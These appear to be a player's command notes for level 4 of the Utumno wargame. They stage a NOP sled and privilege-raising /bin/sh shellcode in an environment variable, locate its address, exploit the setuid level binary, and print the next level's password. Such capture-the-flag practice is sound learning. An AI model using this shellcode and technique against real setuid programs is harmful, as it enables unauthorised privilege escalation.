# Create environment variable EGG
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 65535 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

# Get memory location of EGG
mkdir /tmp/utumno4_ballban
cd /tmp/utumno4_ballban
nano check_env.c
gcc -m32 check_env.c -o check_env
./check_env EGG     # 0xfffeddec

# Copy code from utumno.ipynb
nano utumno4.py

/utumno/utumno4 $(python3 utumno4.py)
cat /etc/utumno_pass/utumno5
# password: vY134qxapL